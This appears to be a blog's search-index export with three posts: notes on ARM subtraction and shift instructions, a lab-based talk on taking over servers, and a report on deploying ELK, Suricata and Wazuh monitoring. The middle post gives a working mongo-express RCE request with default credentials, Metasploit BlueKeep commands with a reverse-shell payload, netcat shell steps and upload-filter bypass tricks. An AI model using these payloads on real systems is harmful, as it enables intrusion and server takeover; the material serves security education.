<td>1</td>
<td>1</td>
</tr>
<tr>
<td>1</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
</tbody></table>
<p><strong>RSB : 反向减法</strong></p>
<p><strong>(Reverse Subtraction)</strong></p>
<p>RSB 用操作数 two 减去操作数 one，把结果放置到目的寄存器中。操作数 1 是一个寄存器，操作数 2 可以是一个寄存器，被移位的寄存器，或一个立即值</p>
<p>RSB{条件}{S} <dest>, &lt;op 1&gt;, &lt;op 2&gt;</p>
<p>dest = op_2 - op_1</p>
<p>RSB R0, R1, R2 ; R0 = R2 - R1</p>
<p>RSB R0, R1, #256 ; R0 = 256 - R1</p>
<p>RSB R0, R2, R3,LSL#1 ; R0 = (R3 &lt;&lt; 1) - R2</p>
<p>例如： [2] </p>
<p>RSB R0,R1,#5 ;R0=5-R1 [2] </p>
<p>RSB R0,R1,R2 ;R0=R2-R1 [2] </p>
<p>RSB R0,R1,R2,LSL#5 ;R0=R2左移5位-R1 [2] </p>
<p>反向减法可以在有符号或无符号数上进行。</p>
<p><strong>RSC : 带借位的反向减法</strong></p>
<p><strong>(Reverse Subtraction with Carry)</strong></p>
<p>RSC指令用于把操作数2减去操作数1，再减去CPSR中的C条件标志位的反码，并将结果存放到目的寄存器中。操作数1应是一个寄存器，操作数2可以是一个寄存器，被移位的寄存器，或一个立即数。该指令使用进位标志来表示借位，这样就可以做大于32位的减法，注意不要忘记设置S后缀来更改进位标志。该指令可用于有符号数或无符号数的减法运算。 [1] </p>
<p>RSC{条件}{S} <dest>, &lt;op 1&gt;, &lt;op 2&gt;</p>
<p>dest = op_2 - op_1 - !carry</p>
<p>例如： [2] </p>
<p>第一个64位操作数存放在寄存器R2，R3中； [2] </p>
<p>第二个64位操作数存放在寄存器R4，R5中； [2] </p>
<p>64位结果存放在R0，R1中。 [2] </p>
<p>64位的减法（第一个操作数减去第二个操作数）可由以下语句实现： [2] </p>
<p>SUBS R0,R2,R4; 低32位相减，S表示结果影响寄存器CPSR的值 [2] </p>
<p>RSC R1,R5,R3; 高32位相减 [2] </p>
<p><strong>SBC : 带借位的减法</strong></p>
<p><strong>(Subtraction with Carry)</strong></p>
<p>SBC 做两个操作数的减法，把结果放置到目的寄存器中。它使用进位标志来表示借位，这样就可以做大于 32 位的减法。SUB 和 SBC 生成进位标志的方式不同于常规，如果需要借位则清除进位标志。所以，指令要对进位标志进行一个非操作 - 在指令执行期间自动的反转此位。op2可以是寄存器、被移位的寄存器或立即数。 [2] </p>
<p>SBC{条件}{S} <dest>, &lt;op 1&gt;, &lt;op 2&gt;</p>
<p>dest = op_1 - op_2 - !carry</p>
<p>例如： [2] </p>
<p>第一个64位操作数存放在寄存器R2，R3中； [2] </p>
<p>第二个64位操作数存放在寄存器R4，R5中； [2] </p>
<p>64位结果存放在R0，R1中。 [2] </p>
<p>64位的减法（第一个操作数减去第二个操作数）可由以下语句实现： [2] </p>
<p>SUBS R0,R2,R4; 低32位相减，S表示结果影响条件标志位的值 [2] </p>
<p>SBC R1,R3,R5; 高32位相减 [2] </p>
<p><strong>SUB : 减法</strong></p>
<p><strong>(Subtraction)</strong></p>
<p>SUB 用操作数 one 减去操作数 two，把结果放置到目的寄存器中。操作数 1 是一个寄存器，操作数 2 可以是一个寄存器，被移位的寄存器，或一个立即值</p>
<p>SUB{条件}{S} <dest>, &lt;op 1&gt;, &lt;op 2&gt;</p>
<p>dest = op_1 - op_2</p>
<p>例如： [2] </p>
<p>SUB R0,R1,#5 ;R0=R1-5 [2] </p>
<p>SUB R0,R1,R2 ;R0=R1-R2 [2] </p>
<p>SUB R0,R1,R2,LSL#5 ;R0=R1-R2左移5位 [2] </p>
<p>SUB R0, R1, R2 ; R0 = R1 - R2</p>
<p>SUB R0, R1, #256 ; R0 = R1 - 256</p>
<p>SUB R0, R2, R3,LSL#1 ; R0 = R2 - (R3 &lt;&lt; 1)</p>
<p>减法可以在有符号和无符号数上进行。</p>
<h3 id="移位指令"><a href="#移位指令" class="headerlink" title="移位指令"></a>移位指令</h3><p>ARM 处理器组建了可以与数据处理指令(ADC、ADD、AND、BIC、CMN、CMP、EOR、MOV、MVN、ORR、RSB、SBC、SUB、TEQ、TST)一起使用的桶式移位器(barrel shifter)。你还可以使用桶式移位器影响在 LDR/STR 操作中的变址值。</p>
<p>译注：移位操作在 ARM 指令集中不作为单独的指令使用，它是指令格式中是一个字段，在汇编语言中表示为指令中的选项。如果数据处理指令的第二个操作数或者单一数据传送指令中的变址是寄存器，则可以对它进行各种移位操作。如果数据处理指令的第二个操作数是立即值，在指令中用 8 位立即值和 4 位循环移位来表示它，所以对大于 255 的立即值，汇编器尝试通过在指令中设置循环移位数量来表示它，如果不能表示则生成一个错误。在逻辑类指令中，逻辑运算指令由指令中 S 位的设置或清除来确定是否影响进位标志，而比较指令的 S 位总是设置的。在单一数据传送指令中指定移位的数量只能用立即值而不能用寄存器。</p>
<p>下面是给不同的移位类型的六个助记符:</p>
<p>LSL 逻辑左移</p>
<p>ASL 算术左移</p>
<p>LSR 逻辑右移</p>
<p>ASR 算术右移</p>
<p>ROR 循环右移</p>
<p>RRX 带扩展的循环右移</p>
<p>ASL 和 LSL 是等同的，可以自由互换。</p>
<p>你可以用一个立即值(从 0 到 31)指定移位数量，或用包含在 0 和 31 之间的一个值的寄存器指定移位数量。</p>
<p><strong>LSL/ASL : 逻辑或算术左移</strong></p>
<p><strong>(Logical or Arithmetic Shift Left)</strong></p>
<p>接受 Rx 的内容并按用‘n’或在寄存器 Rn 中指定的数量向高有效位方向移位。最低有效位用零来填充。除了概念上的第 33 位(就是被移出的最小的那位)之外丢弃移出最左端的高位，如果逻辑类指令中 S 位被设置了，则此位将成为从桶式移位器退出时进位标志的值。</p>
<p>LSL（或ASL）可完成对通用寄存器中的内容进行逻辑（或算术）的左移操作，按操作数所指定的数量向左移位，低位用零来填充。其中，操作数可以是通用寄存器，也可以是立即数（0～31）。 [3] </p>
<p>Rx, LSL #n or</p>
<p>Rx, ASL #n or</p>
<p>Rx, LSL Rn or</p>
<p>Rx, ASL Rn</p>
<p>考虑下列:</p>
<p>MOV R1, #12</p>
<p>MOV R0, R1, LSL#2</p>
<p>在退出时，R0 是 48。 这些指令形成的总和是 R0 = #12, LSL#2 等同于 BASIC 的 R0 = 12 &lt;&lt; 2</p>
<p>MOV R0, R1, LSL#2 ；将R1中的内容左移两位后传送到R0中。 [3] </p>
<p><strong>LSR : 逻辑右移</strong></p>
<p><strong>(Logical Shift Right)</strong></p>
<p>它在概念上与左移相对。把所有位向更低有效位方向移动。如果逻辑类指令中 S 位被设置了，则把最后被移出最右端的那位放置到进位标志中。它同于 BASIC 的 register = value &gt;&gt;&gt; shift。</p>
<p>LSR可完成对通用寄存器中的内容进行右移的操作，按操作数所指定的数量向右移位，左端用零来填充。其中，操作数可以是通用寄存器，也可以是立即数（0～31）。 [3] </p>
<p>Rx, LSR #n or</p>
<p>Rx, LSR Rn</p>
<p>操作示例： [3] </p>
<p>MOV R0, R1, LSR#2 ；将R1中的内容右移两位后传送到R0中，左端用零来填充。 [3]</p>
]]></content>
      <categories>
        <category>ARM汇编</category>
      </categories>
      <tags>
        <tag>ARM汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>技术分享2021.09（获取服务器控制权）</title>
    <url>/sec_share/</url>
    <content><![CDATA[<h2 id="概念介绍"><a href="#概念介绍" class="headerlink" title="概念介绍"></a>概念介绍</h2><h3 id="前渗透"><a href="#前渗透" class="headerlink" title="前渗透"></a>前渗透</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>1、真实IP、开放端口、管理后台、web应用、子域名、中间件以及版本信息、其他…</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>cve漏洞，上传漏洞，Sql注入、XSS，CSRF，逻辑漏洞，跨域漏洞等组合获取服务器权限</p>
<hr>
<h3 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h3><p>权限维持、提权（低权限用户提升至root/System权限）、docker逃逸、反向代理、内网资产绘制、横向渗透、拿域控</p>
<hr>
<h3 id="POC、EXP"><a href="#POC、EXP" class="headerlink" title="POC、EXP"></a>POC、EXP</h3><p>POC：全称 ‘ Proof of Concept ‘，中文 ‘ 概念验证 ‘ ，常指一段漏洞证明的代码。</p>
<p>EXP：全称 ‘ Exploit ‘，中文 ‘ 利用 ‘，指利用系统漏洞进行攻击的动作。</p>
<p><em>POC是用来证明漏洞存在的，EXP是用来利用漏洞的。</em></p>
<hr>
<h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>绕过安全控制而获取对程序或系统访问权的方法。后门的最主要目的就是方便以后再次秘密进入或者控制系统。</p>
<hr>
<h2 id="服务器为什么会被远程控制"><a href="#服务器为什么会被远程控制" class="headerlink" title="服务器为什么会被远程控制"></a>服务器为什么会被远程控制</h2><p><strong>弱口令+后台任意文件上传</strong></p>
<p><em>如何上传对应的小马呢？</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#按URL划分</span><br><span class="line">https:&#x2F;&#x2F;example.com&#x2F;1.asp?id&#x3D;1</span><br><span class="line">https:&#x2F;&#x2F;example.com&#x2F;1.php?id&#x3D;1</span><br><span class="line">https:&#x2F;&#x2F;example.com&#x2F;1.jsp?id&#x3D;1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#按web服务划分</span><br><span class="line">Nginx和Apache：php </span><br><span class="line"></span><br><span class="line">Tomcat(java): jsp ,jspx</span><br><span class="line"></span><br><span class="line">IIS :aspx ,ashx ,asp ,asa ,cer ,cdx</span><br></pre></td></tr></table></figure>
<p><strong>中间件版本/配置存在漏洞</strong></p>
<p><em>部分中间件在特定版本之前都存在通用漏洞。</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">mongo-express， 0.54.0 之前的版本</span><br><span class="line">PHP 7.0 版本</span><br><span class="line">PHP 7.1 版本</span><br><span class="line">PHP 7.2 版本</span><br><span class="line">PHP 7.3 版本</span><br></pre></td></tr></table></figure>
<p><em>web登录页面弱口令/初始口令</em></p>
<p><strong>不安全的服务器配置</strong></p>
<p>高危端口没有关闭、防火墙未启用等等</p>
<hr>
<h2 id="攻击示例"><a href="#攻击示例" class="headerlink" title="攻击示例"></a>攻击示例</h2><h3 id="MongoDB-mongo-express远程代码执行（CVE-2019-10758"><a href="#MongoDB-mongo-express远程代码执行（CVE-2019-10758" class="headerlink" title="MongoDB mongo-express远程代码执行（CVE-2019-10758)"></a>MongoDB mongo-express远程代码执行（CVE-2019-10758)</h3><h4 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h4><p>mongo-express是一款mongodb的第三方Web界面，使用node和express开发。如果攻击者可以成功登录，或者目标服务器没有修改默认的账号密码（admin:pass），则可以执行任意node.js代码。</p>
<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>mongo-express， 0.54.0 之前的版本</p>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>搭建环境，访问web页面查看是否成功；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.35.129:8081</span><br></pre></td></tr></table></figure>
<p>抓包，构造数据包，因为重放数据包只会回显 “Valid“ 或 ”Invalid“ ，所以执行 mkdir 命令创建文件夹测试；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;checkValid HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.35.129</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Basic YWRtaW46cGFzcw&#x3D;&#x3D;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 124</span><br><span class="line"></span><br><span class="line">document&#x3D;this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;mkdir &#x2F;usr&#x2F;1&quot;)</span><br></pre></td></tr></table></figure>
<p>nc监听get shell</p>
<h3 id="PHP远程代码执行漏洞（CVE-2019-11043）"><a href="#PHP远程代码执行漏洞（CVE-2019-11043）" class="headerlink" title="PHP远程代码执行漏洞（CVE-2019-11043）"></a>PHP远程代码执行漏洞（CVE-2019-11043）</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>CVE-2019-11043 是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># nginx.conf</span><br><span class="line"></span><br><span class="line">1 location ~ [^&#x2F;]\.php(&#x2F;|$) &#123;</span><br><span class="line">2  ...</span><br><span class="line">3  fastcgi_split_path_info ^(.+?\.php)(&#x2F;.*)$;</span><br><span class="line">4  fastcgi_param PATH_INFO $fastcgi_path_info;</span><br><span class="line">5  fastcgi_pass   php:9000;</span><br><span class="line">6  ...</span><br><span class="line">7 &#125;</span><br></pre></td></tr></table></figure>
<p>向Nginx + PHP-FPM的服务器 URL发送 %0a 时，服务器返回异常。</p>
<p><em>PHP-FPM(FastCGI Process Manager：FastCGI进程管理器)是一个PHPFastCGI管理器.PHP-FPM提供了更好的PHP进程管理]方式，可以有效控制内存和进程、可以平滑重载PHP配置</em></p>
<h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><ul>
<li>PHP 7.0 版本</li>
<li>PHP 7.1 版本</li>
<li>PHP 7.2 版本</li>
<li>PHP 7.3 版本</li>
</ul>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>构建环境，查看是否正常运行；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.35.129:8080&#x2F;index.php</span><br></pre></td></tr></table></figure>
<p>运行exp文件，访问web的index.php?a=whoami测试；</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/09/08/fR4AKz7hWdBTJP2.png" alt="php-exp"></p>
<p>公网服务器使用 nc 监听端口；</p>
<p>web执行nc命令或bash一句话；</p>
<p>getshell ~</p>
<h3 id="远程桌面代码执行漏洞（CVE-2019-0708）"><a href="#远程桌面代码执行漏洞（CVE-2019-0708）" class="headerlink" title="远程桌面代码执行漏洞（CVE-2019-0708）"></a>远程桌面代码执行漏洞（CVE-2019-0708）</h3><h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>Windows系列服务器于2019年5月15号，被爆出高危漏洞，该漏洞影响范围较广，漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的。这个漏c洞和2017年的永恒之蓝病毒有类似之处。</p>
<p><em>利用此漏洞前置条件是符合影响的系统版本，没有打相对应的漏洞补丁。并且开启了3389端口。</em></p>
<h4 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h4><p>Windows 7</p>
<p>Windows server 2008 R2</p>
<p>Windows server 2008</p>
<p>Windows 2003</p>
<p>Windows xp</p>
<h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>确定了受害机后，在攻击机端进入msf环境；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">msfconsole</span></span><br></pre></td></tr></table></figure>
<p>搜索对应cve-2019-0708的利用脚本；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">search 0708</span></span><br></pre></td></tr></table></figure>
<p>验证确认存在漏洞后使用攻击模块；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span></span><br></pre></td></tr></table></figure>
<p>设置参数、payload并利用；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">show options</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span></span><br></pre></td></tr></table></figure>
<p>有可能蓝屏，有可能反弹回shell。</p>
<h3 id="永恒之蓝（ms17-010）"><a href="#永恒之蓝（ms17-010）" class="headerlink" title="永恒之蓝（ms17-010）"></a>永恒之蓝（ms17-010）</h3><h4 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>永恒之蓝漏洞是方程式组织在其漏洞利用框架中一个针对<strong>SMB服务</strong>进行攻击的漏洞，该漏洞导致攻击者在目标系统上<strong>可以执行任意代码</strong>。</p>
<p>SMB服务的作用：该服务在Windows与UNIX系列的OS之间搭起一座桥梁，让两者的资源可互通有无。</p>
<h4 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h4><p>Windows XP</p>
<p>Windows Vista</p>
<p>Windows 7</p>
<p>Windows 8.1</p>
<p>Windows 10</p>
<p>Windows Server 2003</p>
<p>Windows Server 2008</p>
<p>Windows Server2008 R2</p>
<p>Windows Server 2012</p>
<p>Windows Server 2012 R2</p>
<p>Windows Server 2016</p>
<h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>使用msf</p>
<p>搜索ms17-010</p>
<p>设置payload，使用exp</p>
<p>getshell</p>
<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><h4 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h4><p>上传文件的时，如果未对上传的文件进行严格的验证和过滤，就容易造成文件上传漏洞，上传脚本等。</p>
<h4 id="造成的危害"><a href="#造成的危害" class="headerlink" title="造成的危害"></a>造成的危害</h4><p>导致网站甚至整个服务器被控制。</p>
<h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>收集网站信息，寻找文件上传点；</p>
<p>确认网站是php还是asp还是jsp等类型；</p>
<p>上传小马，如果上传失败尝试绕过；</p>
<p><strong>常见的绕过方式：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">前端js检查绕过;</span><br><span class="line">黑名单绕过;</span><br><span class="line">大小写绕过;</span><br><span class="line">点绕过;</span><br><span class="line">空格绕过;</span><br><span class="line">双写绕过;</span><br><span class="line">00截断(php版本小于5.3.4);</span><br><span class="line">图片马绕过;</span><br><span class="line">条件竞争绕过;</span><br></pre></td></tr></table></figure>
<p><strong>针对中间件的绕过方式</strong></p>
<p>IIS文件解析漏洞;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;test.asp&#x2F;test.jpg</span><br><span class="line">test.asp;.jpg</span><br></pre></td></tr></table></figure>
<p>tomcat：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.war</span><br><span class="line">#解析后是test&#x2F;test.jsp</span><br></pre></td></tr></table></figure>
<p>上传成功后，使用后门连接工具连接小马，getshell</p>
<h2 id="拿到服务器以后的目的"><a href="#拿到服务器以后的目的" class="headerlink" title="拿到服务器以后的目的"></a>拿到服务器以后的目的</h2><p>收集完这一台服务器的信息后会做什么，跑路吗？</p>
<p>反向代理，进入内网环境，横向渗透，拿到域控</p>
<p>企业上云更安全</p>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>进度分享（第二阶段）</title>
    <url>/%E6%8C%91%E6%88%98%E9%A1%B9%E7%9B%AE_%E8%BF%9B%E5%BA%A6%E5%88%86%E4%BA%AB/</url>
    <content><![CDATA[<h2 id="第一阶段完成了什么"><a href="#第一阶段完成了什么" class="headerlink" title="第一阶段完成了什么"></a>第一阶段完成了什么</h2><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/09/22/v62blA1W9G4Ncpd.png" alt="阶段一-方案A"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/09/22/WsGtxPuB6k8mgec.png" alt="阶段一-方案B"></p>
<h3 id="ELK服务器的各个服务部署"><a href="#ELK服务器的各个服务部署" class="headerlink" title="ELK服务器的各个服务部署"></a>ELK服务器的各个服务部署</h3><ul>
<li>Logstash</li>
<li>ElsticSearch</li>
<li>Kibana</li>
</ul>
<h3 id="被监控服务器的各个服务部署"><a href="#被监控服务器的各个服务部署" class="headerlink" title="被监控服务器的各个服务部署"></a>被监控服务器的各个服务部署</h3><ul>
<li>Suricata</li>
<li>Filebeat</li>
</ul>
<h3 id="问题-amp-解决方案"><a href="#问题-amp-解决方案" class="headerlink" title="问题&amp;解决方案"></a>问题&amp;解决方案</h3><ol>
<li><p><strong>Logstash占用CPU性能过高问题</strong></p>
<p>更改所有suricata服务器中的配置文件，将低风险包以及仅包含正常流量信息舍弃，限制只捕获可疑流量包。（期间尝试过限制同时处理包个数，因流量包过多，传输会堵塞，累计堵塞越来越多。且数据存在延时。）</p>
<p><em>采用上述方法后同时解决了“ES占用性能过高”、“kafka堆积过多”的问题</em></p>
</li>
<li><p><strong>Message字段问题</strong></p>
<p>在ELK服务器中使用logstash的grok插件，配置文件中编写正则表达式，因为格式限制，所以只能将所有字段的匹配汇总到一条正则表达式中。</p>
</li>
</ol>
<h3 id="可以查看哪些信息"><a href="#可以查看哪些信息" class="headerlink" title="可以查看哪些信息"></a>可以查看哪些信息</h3><ul>
<li>自定义时间范围内的攻击趋势</li>
<li>自定义重点关注的对象（源IP、被攻击服务器名称、攻击事件）</li>
<li>自定义可视化、仪表盘</li>
<li></li>
</ul>
<h2 id="第二阶段计划"><a href="#第二阶段计划" class="headerlink" title="第二阶段计划"></a>第二阶段计划</h2><ul>
<li>ELK服务器的Wazuh管理端搭建    </li>
<li>与ES数据连通</li>
<li>完成各Agent节点部署并成功上线</li>
<li>可通过Kibana端的wazuh插件直接管理/分析各Agent节点的数据</li>
</ul>
<h2 id="第二阶段完成了什么"><a href="#第二阶段完成了什么" class="headerlink" title="第二阶段完成了什么"></a>第二阶段完成了什么</h2><h3 id="ELK服务器的各个服务部署-1"><a href="#ELK服务器的各个服务部署-1" class="headerlink" title="ELK服务器的各个服务部署"></a>ELK服务器的各个服务部署</h3><ul>
<li>Wazuh-Manager</li>
<li>Filebeat</li>
</ul>
<h3 id="被监控服务器的服务部署"><a href="#被监控服务器的服务部署" class="headerlink" title="被监控服务器的服务部署"></a>被监控服务器的服务部署</h3><ul>
<li>Wazuh-Agent</li>
</ul>
<h3 id="已完成部署的服务器："><a href="#已完成部署的服务器：" class="headerlink" title="已完成部署的服务器："></a>已完成部署的服务器：</h3><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/09/22/IGa754eiorhlfVJ.png" alt="已部署（1）"><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/09/22/1r2zdgcfhnoK5BP.png" alt="已部署（2）"></p>
<h3 id="目前已实现的功能"><a href="#目前已实现的功能" class="headerlink" title="目前已实现的功能"></a>目前已实现的功能</h3><ul>
<li><p><strong>主机安全入侵检测</strong></p>
<p>扫描受监控的系统，寻找恶意软件和可疑进程。它们可以检测隐藏文件、隐藏进程或网络监听器。</p>
</li>
<li><p><strong>日志数据分析</strong></p>
<p>读取操作系统和应用程序日志，识别应用程序或系统错误、错误配置、尝试或已成功的恶意活动、策略违规以及其他安全和操作问题。</p>
</li>
<li><p><strong>文件完整性监控</strong></p>
<p>识别需要注意的文件的内容、权限、所有权和属性的变化。</p>
</li>
<li><p><strong>CVE漏洞检测</strong></p>
<p>agent提取软件清单数据并将此信息发送到manager，与CVE漏洞库中的信息作比较。</p>
</li>
<li><p><strong>安全配置评估</strong></p>
<p>监控系统和应用程序配置设置，以确保它们符合安全策略、并且提供对应描述与修复措施。</p>
</li>
<li><p><strong>安全合规性检测</strong></p>
<p>提供了一些必要的安全控制，以符合行业标准和法规。</p>
</li>
</ul>
<h3 id="问题-amp-解决方案-1"><a href="#问题-amp-解决方案-1" class="headerlink" title="问题&amp;解决方案"></a>问题&amp;解决方案</h3><ol>
<li><p><strong>存储的日志数据过多</strong></p>
<p>启用ElasticSearch生命周期管理，30天温和处理，60天冷处理，180天删除处理。</p>
</li>
<li><p><strong>Wazuh如何识别不同Agent的信息</strong></p>
<p>Agent节点注册时会默认使用服务器主机名称作为节点名称，注册后先暂不启动服务 ，使用“agent-auth”功能新注册节点，自定义为可以直观识别出服务器的名称，启动服务后再Wazuh-manager端删除原先默认注册的名称。</p>
</li>
<li><p><strong>数据传输不通</strong></p>
<p>使用docker容器部署wazuh服务，因为docker自带了filebeat、ES、Kibana等服务，启动容器时注释掉ES和Kibana，只启动Wazuh与filebeat，停用本地filebeat服务，使用容器内filebeat将数据传输到本地ES。</p>
</li>
<li><p><strong>Agent显示已注册成功，但Manager端收不到数据</strong></p>
<p>定位到原因是因为Manager端使用了云服务器，TCP传输端口“1514”、“1515”默认禁止连接，在云服务器后台开放端口连接后，成功接收到数据。</p>
</li>
<li><p><strong>部分agent节点掉线</strong></p>
<p>部分服务器设置了定时重启，需要将agent加入到开机启动项中。</p>
</li>
<li><p><strong>Kibana调用wazuh-api报错</strong></p>
<p>kibana安装wazuh模块以后，需要把模块配置改为使用https方式调用wazuh-api，并指定wazuh的地址，使用http协议会报错“内部服务器错误”</p>
</li>
</ol>
]]></content>
      <categories>
        <category>挑战项目</category>
      </categories>
      <tags>
        <tag>挑战项目</tag>
      </tags>
  </entry>
</search>
